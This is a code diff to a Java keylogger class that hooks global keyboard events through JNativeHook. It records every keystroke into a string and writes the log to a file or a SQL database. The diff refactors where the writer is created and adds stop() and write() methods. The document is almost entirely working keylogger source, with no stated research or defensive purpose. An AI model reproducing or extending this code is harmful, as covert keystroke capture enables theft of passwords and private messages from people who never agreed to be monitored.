@@ -18,7 +18,19 @@ public class KeyLogger implements NativeKeyListener {
 
     private static String log = "";
     private boolean st, ctrl, alt, capslock;
-
+    private OutputStream os;
+    {
+        try {
+            os = Files.newOutputStream(
+                    file,
+                    StandardOpenOption.CREATE,
+                    StandardOpenOption.WRITE,
+                    StandardOpenOption.APPEND);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+    private PrintWriter writer = new PrintWriter(os);
     private int writingInWhat = 0;
 
     /**
@@ -27,7 +39,6 @@ public class KeyLogger implements NativeKeyListener {
      * 0 is logging into a file
      * 1 is logging into a database
      */
-
     public void setLogInWhat(final int what){
         this.writingInWhat = what;
     }
@@ -39,6 +50,15 @@ public class KeyLogger implements NativeKeyListener {
             System.exit(1);
         }
         GlobalScreen.addNativeKeyListener(new KeyLogger());
+
+    }
+
+    public void stop(){
+        try{
+            GlobalScreen.unregisterNativeHook();
+        } catch (NativeHookException e) {
+            e.printStackTrace();
+        }
     }
 
     @Override
@@ -51,42 +71,30 @@ public class KeyLogger implements NativeKeyListener {
 
         String keyText = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
 
-        try (
-                OutputStream os = Files.newOutputStream(
-                file,
-                StandardOpenOption.CREATE,
-                StandardOpenOption.WRITE,
-                StandardOpenOption.APPEND);
-             PrintWriter writer = new PrintWriter(os)) {
-            if (keyText.length() > 1) {
-                log = log + "[" + keyText + "]";
-                //writer.print("[" + keyText + "]");
+        if (keyText.length() > 1) {
+            log = log + "[" + keyText + "]";
+            //writer.print("[" + keyText + "]");
 
-            } else {
-                log = log + keyText;
-                //writer.print(keyText);
-            }
-
-            if(writingInWhat == 0){
-                writer.print(log);
-            }
-            else if(writingInWhat == 1){
-                SQLDatabaseConnection sqlDatabaseConnection = new SQLDatabaseConnection();
-                sqlDatabaseConnection.connect();
-                sqlDatabaseConnection.createTable();
-                sqlDatabaseConnection.writeIntoDatabase(log);
-            }
-        } catch (IOException e) {
-            System.exit(-1);
+        } else {
+            log = log + keyText;
+            //writer.print(keyText);
         }
-
-
-
-
     }
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
 
+    }
+
+    public void write(){
+        if(writingInWhat == 0){
+            writer.print(log);
+        }
+        else if(writingInWhat == 1){
+            SQLDatabaseConnection sqlDatabaseConnection = new SQLDatabaseConnection();
+            sqlDatabaseConnection.connect();
+            sqlDatabaseConnection.createTable();
+            sqlDatabaseConnection.writeIntoDatabase(log);
+        }
     }
 }
